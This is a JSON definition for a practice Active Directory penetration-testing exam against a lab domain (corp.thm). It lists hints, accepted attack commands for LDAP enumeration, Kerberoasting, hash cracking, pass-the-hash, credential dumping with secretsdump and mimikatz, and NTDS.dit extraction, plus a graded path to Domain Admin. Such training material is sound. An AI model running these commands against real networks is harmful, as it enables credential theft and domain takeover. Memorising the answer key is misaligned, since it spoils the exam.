@@ -1,0 +1,182 @@
+{
+  "examType": "PT1 AD + Lateral Movement Practice",
+  "timeLimit": 90,
+  "description": "Active Directory penetration testing exam focusing on LDAP enumeration, Kerberos roasting, credential abuse, BloodHound-style reasoning, and lateral movement techniques.",
+  "difficulty": "intermediate",
+  "scenarios": [
+    {
+      "targetIP": "10.10.10.250",
+      "targetDomain": "corp.thm",
+      "domainController": "DC01.corp.thm",
+      "description": "Windows Active Directory domain with 150+ users, multiple service accounts, and misconfigured permissions",
+      "openPorts": [
+        "53/tcp - DNS",
+        "88/tcp - Kerberos",
+        "135/tcp - RPC",
+        "139/tcp - NetBIOS",
+        "389/tcp - LDAP",
+        "445/tcp - SMB",
+        "464/tcp - Kerberos Password Change",
+        "636/tcp - LDAPS",
+        "3268/tcp - Global Catalog",
+        "3389/tcp - RDP (filtered)"
+      ],
+      "objectives": [
+        "Enumerate domain users via LDAP",
+        "Identify privileged groups and members",
+        "Map user-group relationships",
+        "Perform Kerberoasting attack to extract service account hashes",
+        "Crack service account passwords",
+        "Enumerate SMB shares with valid credentials",
+        "Identify lateral movement paths",
+        "Demonstrate Pass-the-Hash or Pass-the-Ticket",
+        "Escalate to Domain Admin privileges",
+        "Extract domain user flag and Domain Admin flag"
+      ],
+      "hints": {
+        "strategic": "Active Directory attacks follow a pattern: enumerate → extract → crack → lateral movement → domain admin. Start with LDAP enumeration to map the domain structure.",
+        "tactical": "Service accounts with SPNs are Kerberoastable. Look for accounts in common groups: Domain Admins, Enterprise Admins, Account Operators. BloodHound can visualize attack paths.",
+        "technical": "Impacket toolkit is essential: GetUserSPNs.py for Kerberoasting, secretsdump.py for credential extraction, psexec.py for lateral movement. CrackMapExec (or NetExec) is the Swiss Army knife of AD pentesting.",
+        "specific": "Default LDAP queries: ldapsearch -x -H ldap://10.10.10.250 -b 'DC=corp,DC=thm'. For Kerberoasting: GetUserSPNs.py corp.thm/user:password -request -outputfile hashes.txt"
+      },
+      "validApproaches": {
+        "ldapEnumeration": [
+          "ldapsearch -x -H ldap://10.10.10.250 -b 'DC=corp,DC=thm' '(objectClass=user)'",
+          "windapsearch.py -d corp.thm -u user -p password --users",
+          "crackmapexec ldap 10.10.10.250 -u user -p password --users",
+          "nxc ldap 10.10.10.250 -u user -p password --users",
+          "bloodyAD -u user -p password -d corp.thm --host 10.10.10.250 get object 'Domain Users'"
+        ],
+        "kerberoasting": [
+          "GetUserSPNs.py corp.thm/user:password -request -outputfile hashes.txt",
+          "impacket-GetUserSPNs corp.thm/user:password -request",
+          "Rubeus.exe kerberoast /outfile:hashes.txt (from Windows)",
+          "crackmapexec ldap 10.10.10.250 -u user -p password --kerberoasting hashes.txt",
+          "nxc ldap 10.10.10.250 -u user -p password --kerberoasting hashes.txt"
+        ],
+        "hashCracking": [
+          "hashcat -m 13100 hashes.txt rockyou.txt",
+          "john --wordlist=rockyou.txt --format=krb5tgs hashes.txt",
+          "hashcat -m 13100 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt"
+        ],
+        "smbEnumeration": [
+          "crackmapexec smb 10.10.10.250 -u user -p password --shares",
+          "nxc smb 10.10.10.250 -u user -p password --shares",
+          "smbclient -L //10.10.10.250 -U user%password",
+          "smbmap -H 10.10.10.250 -u user -p password"
+        ],
+        "lateralMovement": [
+          "psexec.py corp.thm/admin:password@10.10.10.250",
+          "wmiexec.py corp.thm/admin:password@10.10.10.250",
+          "crackmapexec smb 10.10.10.250 -u admin -p password -x whoami",
+          "nxc smb 10.10.10.250 -u admin -p password -x whoami",
+          "evil-winrm -i 10.10.10.250 -u admin -p password"
+        ],
+        "passTheHash": [
+          "crackmapexec smb 10.10.10.250 -u admin -H NTLMHASH",
+          "nxc smb 10.10.10.250 -u admin -H NTLMHASH",
+          "psexec.py -hashes NTLMHASH corp.thm/admin@10.10.10.250",
+          "evil-winrm -i 10.10.10.250 -u admin -H NTLMHASH"
+        ],
+        "credentialDumping": [
+          "secretsdump.py corp.thm/admin:password@10.10.10.250",
+          "crackmapexec smb 10.10.10.250 -u admin -p password --sam",
+          "nxc smb 10.10.10.250 -u admin -p password --sam",
+          "crackmapexec smb 10.10.10.250 -u admin -p password --lsa"
+        ],
+        "bloodHoundEnumeration": [
+          "bloodhound-python -c All -u user -p password -d corp.thm -ns 10.10.10.250",
+          "SharpHound.exe -c All (from Windows)",
+          "Import into BloodHound GUI for path analysis"
+        ]
+      },
+      "commandCommentary": {
+        "ldapsearch": "Standard LDAP query tool. Flags: -x (simple auth), -H (LDAP URI), -b (base DN), -D (bind DN), -w (password). Essential for manual AD enumeration.",
+        "GetUserSPNs.py": "Impacket tool for Kerberoasting. Extracts TGS tickets for service accounts. Output can be cracked with hashcat/john. Requires valid domain credentials.",
+        "crackmapexec": "Swiss Army knife of AD pentesting. Supports SMB, LDAP, WinRM, MSSQL, RDP protocols. Flags: -u (username), -p (password), -H (NTLM hash), --shares, --sam, --lsa.",
+        "nxc": "NetExec - modern fork of CrackMapExec with additional features. Same syntax as crackmapexec. Recommended for Kali 2024+. Supports multiple protocols and database storage.",
+        "psexec.py": "Impacket tool for remote command execution. Requires admin credentials or NTLM hash. Creates service on target - can be detected by EDR.",
+        "secretsdump.py": "Impacket tool for credential extraction. Dumps SAM, LSA secrets, cached credentials, NTDS.dit. Requires admin privileges on target.",
+        "hashcat": "GPU-accelerated password cracker. Mode 13100 for Kerberos TGS-REP. Mode 1000 for NTLM. Much faster than john on systems with GPU.",
+        "bloodhound": "Graph-based AD relationship mapper. Identifies shortest path to Domain Admin. Collector: bloodhound-python (Python) or SharpHound (C#). GUI for analysis."
+      },
+      "kaliAlternatives": {
+        "crackmapexec": "nxc (NetExec), Invoke-SMBExec.ps1, SharpExec",
+        "impacket-psexec": "wmiexec.py, smbexec.py, dcomexec.py, evil-winrm",
+        "GetUserSPNs.py": "Rubeus.exe (Windows), Invoke-Kerberoast.ps1",
+        "ldapsearch": "windapsearch.py, ldapdomaindump, bloodyAD",
+        "bloodhound-python": "SharpHound.exe, Invoke-BloodHound.ps1, ADExplorer",
+        "secretsdump.py": "mimikatz (sekurlsa::logonpasswords), procdump + mimikatz, lsassy"
+      },
+      "attackPath": {
+        "phase1": {
+          "name": "Initial Access & Enumeration",
+          "steps": [
+            "Obtain valid domain credentials (provided or via password spray)",
+            "Enumerate domain users via LDAP",
+            "Identify privileged groups and their members",
+            "Map service accounts with SPNs"
+          ]
+        },
+        "phase2": {
+          "name": "Kerberoasting & Credential Abuse",
+          "steps": [
+            "Extract TGS tickets for service accounts using GetUserSPNs.py",
+            "Crack service account hashes offline with hashcat",
+            "Test cracked credentials against SMB shares",
+            "Identify high-value targets for lateral movement"
+          ]
+        },
+        "phase3": {
+          "name": "Lateral Movement",
+          "steps": [
+            "Use valid credentials to access workstations/servers",
+            "Dump credentials from compromised machines",
+            "Identify Domain Admin sessions",
+            "Move laterally towards Domain Controller"
+          ]
+        },
+        "phase4": {
+          "name": "Domain Dominance",
+          "steps": [
+            "Obtain Domain Admin credentials or hash",
+            "Access Domain Controller",
+            "Extract NTDS.dit and SYSTEM hive",
+            "Dump all domain hashes",
+            "Capture both user and Domain Admin flags"
+          ]
+        }
+      }
+    }
+  ],
+  "gradingCriteria": {
+    "ldapEnumeration": {
+      "weight": 15,
+      "signals": ["LDAP query executed", "users enumerated", "groups identified", "privileged accounts found"]
+    },
+    "kerberoasting": {
+      "weight": 20,
+      "signals": ["SPNs discovered", "TGS tickets extracted", "hashes obtained", "correct tool used"]
+    },
+    "hashCracking": {
+      "weight": 10,
+      "signals": ["hashcat or john used", "wordlist specified", "service account password cracked"]
+    },
+    "credentialAbuse": {
+      "weight": 15,
+      "signals": ["valid credentials used", "SMB shares enumerated", "pass-the-hash demonstrated"]
+    },
+    "lateralMovement": {
+      "weight": 20,
+      "signals": ["moved to another system", "psexec/wmiexec used", "remote execution demonstrated", "correct methodology"]
+    },
+    "bloodHoundReasoning": {
+      "weight": 10,
+      "signals": ["attack path identified", "shortest path to DA", "relationship analysis", "strategic thinking"]
+    },
+    "domainDominance": {
+      "weight": 10,
+      "signals": ["Domain Admin achieved", "NTDS.dit dumped", "all flags captured", "full domain compromise"]
+    }
+  }
+}
